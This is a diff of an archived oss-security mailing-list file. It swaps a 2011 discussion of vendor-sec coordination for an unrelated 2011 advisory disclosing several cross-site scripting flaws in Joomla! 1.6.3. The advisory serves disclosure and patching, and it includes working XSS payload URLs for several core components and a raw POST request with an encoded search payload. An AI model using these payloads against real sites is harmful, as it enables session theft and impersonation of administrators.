@@ -1,158 +1,136 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/07/8
-Message-ID: <20110307185753.GA13625@1wt.eu>
-Date: Mon, 7 Mar 2011 19:57:53 +0100
-From: Willy Tarreau <w@....eu>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/28/4
+Message-ID: <BANLkTinokSP7O3x4mP0JxagVgd7cHcwd=Q@mail.gmail.com>
+Date: Tue, 28 Jun 2011 14:25:47 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Subject: Re: Vendor-sec hosting and future of closed lists
+Subject: CVE Request: Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Hi Alexander,
+Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
 
-On Fri, Mar 04, 2011 at 01:49:20AM +0300, Solar Designer wrote:
-> On Thu, Mar 03, 2011 at 07:12:24PM +0100, Marcus Meissner wrote:
-> > So I would like to open up a discussion with _all_ OSS Security folks present.
-> > 
-> > - Is a closed vendor coordination like vendor-sec still needed at this time?
-> 
-> Yes, there's some need for it.
 
-Yes i too agree for this, at least just for coordination and for the few
-"this thing smells really bad, can someone have a look".
 
-> >   Meaning: does the benefit of a closed group really outweigh the
-> >   "left out feeling" of non members and its annoyances?
-> 
-> In that meaning, I am not sure.  These things are not possible to
-> compare, and there are other things to consider as well.
+1. OVERVIEW
 
-I observe very different behaviours between v-sec and sec@.... v-sec is
-much more coordination oriented. sec@k.o is more a switch to quickly get
-the skilled people involved. In fact, the first response to a message posted
-to sec@k.o generally is a CC to a bunch of people supposed to be skilled on
-the subject. CRDs are not accepted and tend to get Linus very nervous. In
-the end, patches get merged very quickly. So that way of working looks very
-efficient to me and the small group as the entry point is a benefit (in my
-opinion).
+Joomla! 1.6.3 and lower are vulnerable to multiple Cross Site Scripting issues.
 
-V-sec on the other hand has to concentrate on coordination because there are
-multiple vendors with different constraints. So there are many readers as
-Marcus said. The risk of leak is much more important, because many of the
-subscribers are not interested in the other ones' issues, so they will
-possibly be less careful.
 
-Also, since the primary goal is to get a CRD, embargoes tend to last longer,
-and issues seem to be mostly handled by the group than by external project
-authors. One of the reasons might simply be that it's less easy to reliably
-get a yet unknown maintainer to cooperate on an issue when he's never been
-involved in the process, than it is in a single project like the linux kernel.
-And there are all the uncontrollable ones who publish the fix before the CRD.
+2. BACKGROUND
 
-So most likely the first part of the process (switching to the right people)
-is better handled by a small group, but the second part needs larger audience
-(in my opinion).
+Joomla is a free and open source content management system (CMS) for
+publishing content on the World Wide Web and intranets. It comprises a
+model–view–controller (MVC) Web application framework that can also be
+used independently.
+Joomla is written in PHP, uses object-oriented programming (OOP)
+techniques and software design patterns, stores data in a MySQL
+database, and includes features such as page caching, RSS feeds,
+printable versions of pages, news flashes, blogs, polls, search, and
+support for language internationalization.
 
-My observation is that the persons doing the first forwarding of the issue
-to the appropriate people are generally the same on a given list, whether
-it is v-sec or sec@.... Maybe this small group of very active watchers
-should constitute the small group and once a fix gets in sight, then the
-various vendors could be involved for a CRD.
 
-> > - If yes, would it be an idea to confine or split into lists of focus groups?
-> >   (like Linux vendors, BSD vendors, all OSS source using vendors, etc?)
-> 
-> My current proposal is: split into several sub-lists.  I'd start with
-> three: Linux vendors, *BSD vendors, security "researchers".  The vendor
-> groups would be for externally submitted reports (by non-members) and
-> for cross-vendor discussions.
-> 
-> The Linux vendors group should include distro vendors.  I am unsure
-> whether it should also include Linux kernel-only folks or not.  Maybe we
-> should be CC'ing security@k.o on relevant messages instead, or maybe we
-> need a separate group for Linux distros+kernel.  It feels wrong to
-> expose userland-only issues to the kernel-only folks.
+3. VULNERABILITY DESCRIPTION
 
-My opinion is that before I was on sec@k.o I was much more interested in
-v-sec than I am now, because it was my only way to get notified of critical
-issues. But most of the discussions on v-sec and even oss-sec concern user
-land programs that sometimes I've never even heard of or at least am not
-using.
+Several parameters (QueryString, option, searchword) in Joomla! Core
+components (com_content, com_contact, com_newsfeeds, com_search) are
+not properly sanitized upon submission to the /index.php url, which
+allows attacker to conduct Cross Site Scripting attack. This may allow
+an attacker to create a specially crafted URL that would execute
+arbitrary script code in a victim's browser.
 
-My participation to the v-sec list has been somewhat limited, and if it
-was only distro-oriented, I would have nothing to do there (I should not
-even be aware of issues prior to public release).
 
-On the other hand, I find it natural that various distro making use of the
-same package are involved in getting it fixes, whether they're Linux-based,
-BSD-based or even Solaris or whatever. Eg: ghostscript is almost everywhere.
-If it needs to be handled on all distros at once, it makes sense to involve
-more vendors than now.
+4. VERSION AFFECTED
 
-> The researchers group would (probably) rarely receive external reports
-> directly, but could be involved in Linux and/or *BSD vendors discussions
-> by CC'ing them when their expertise is needed.
+1.6.3 and lower
 
-My feeling is that some of them as been as much active once out of the list
-as when they were in the list. Granted once out of the list we lacked their
-expertise to solve some issues, but it's the responsibility of the group to
-quickly forward to the skilled people, and researchers may step up
-indicating that they're willing to help when asked.
 
-> Alternatively, the
-> researchers may be included on the vendor lists, which will enable and
-> encourage them to contribute a lot more, but then we need to define some
-> stricter requirements for them (some minimum activity level?)  We don't
-> want a lot of inactive members on any of these private lists.
+5. PROOF-OF-CONCEPT/EXPLOIT
 
-But maybe most of the discussions there is more like CRD noise than useful
-material.
 
-> As to projects such as, say, Samba and X.org, I'd exclude them.
-> There's no difficulty for a researcher to notify one of these directly,
-> and there's not much difficulty in CC'ing the proper one of these on a
-> discussion.
+component: com_contact , parameter: QueryString (Browser: All)
+===============================================================
 
-Agreed, projects are not distros. Ditto for Apache and the Linux kernel,
-or whatever else such autonomous component. They can be CCed at any moment
-by the group. Probably that the rules about disclosure should be relaxed so
-that any member could take the responsibility to CC any relevant people out
-of the group.
+http://attacker.in/joomla163_noseo/index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1"><script>alert(/XSS/)</script>
 
-> > - Or of course the old option is open:
-> >   Should we proceed with the current state as-is,
-> > but throw a bit more GPG encryption on top?
-> 
-> I think we should have the new list(s), if we do set them up,
-> GPG-encrypting to the members.  They should also accept encrypted
-> messages (to the list's key).
-> 
-> This will reduce the likelihood of leaks somewhat - from the members'
-> mail servers, from their unattended mailboxes, etc.
 
-I'm really not convinced by that. If the end user is compromised, the MUA
-is as much as risk as the MTA, and this trend will probably grow. Also, I
-suspect that some of the leaking is caused by some persons not totally
-involved in certain issues being a bit less careful about the required
-confidentiality. It can be tempting to vaguely discuss the interesting
-technical issues with a coworker or friend, but if done before the CRD,
-even with limited information, that could cause some leakage. And GPG
-will not address this. At least it will clearly indicate what leaks on
-the user-side since the infrastructure will not be presented as a
-possible cause anymore ;-)
+component:com_content , parameter:  QueryString (Browser: All)
+===============================================================
 
-> That said, leaks would nevertheless be quite likely - or at least we
-> should assume so.  For this reason, I think these lists should be used
-> for medium severity issues only, and CRDs should be set not too far into
-> the future (say, up to 2 weeks, with an attempt to make embargoes
-> shorter than that whenever possible).
+http://attacker.in/joomla163_noseo/index.php?option=com_content&view=category&id=19&Itemid=260&limit=10&filter_order_Dir=&limitstart=&filter_order=><script>alert(/XSS/)</script>
 
-In fact, it would be better to indicate to posters that whatever is
-posted can be immediately released, and that instead of considering
-that there's a default embargo, everyone who wants an embargo quickly
-has to say it (including the poster) and explain why. After a few days
-you have much more reasonable embargoes. All the rest will quickly go
-to the public lists (eg: oss-sec).
 
-Best regards,
-Willy
+component: com_newsfeeds , parameter: QueryString (Browser: All)
+=================================================================
 
+http://attacker.in/joomla163_noseo/index.php?option=com_newsfeeds&view=category&id=17&whateverehere="><script>alert(/XSS/)</script>&Itemid=253&limit=10&filter_order_Dir=ASC&filter_order=ordering
+
+
+parameter: option (Browser: All)
+====================================
+
+http://attacker.in/joomla163_noseo/index.php?option="><script>alert(/XSS/)</script>&task=reset.request
+
+
+component: com_search, parameter: searchword (Browser: IE, Konqueror)
+=====================================================================
+
+[REQUEST]
+POST /joomla163/index.php HTTP/1.1
+Referer: http://attacker.in/joomla163/
+User-Agent: Konqueror/4.5
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Host: attacker.in
+Accept-Encoding: gzip, deflate
+Content-Length: 125
+
+option=com_search&searchword='%2522%253C%252Fscript%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E&task=search
+[/REQUEST]
+
+This searchword XSS was identified via source code:
+http://yehg.net/lab/pr0js/advisories/joomla/core/1.6.3/xss/XSS%20%5bMode=SEO,NON-SEO%5d/(searchword)_xss_vuln_code_portion.jpg
+
+
+6. IMPACT
+
+Attackers can compromise currently logged-in user/administrator
+session and impersonate arbitrary user actions available under
+/administrator/ functions.
+
+
+7. SOLUTION
+
+Upgrade to Joomla! 1.6.4 or higher
+
+
+8. VENDOR
+
+Joomla! Developer Team
+http://www.joomla.org
+
+
+9. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+10. DISCLOSURE TIME-LINE
+
+2011-05-26: notified vendor
+2011-06-28: vendor released fix
+2011-06-28: vulnerability disclosed
+
+
+11. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
+Vendor Advisory URL:
+http://developer.joomla.org/security/news/352-20110604-xss-vulnerability.html
+XSS FAQ: http://www.cgisecurity.com/xss-faq.html
+OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+#yehg [2011-06-28]
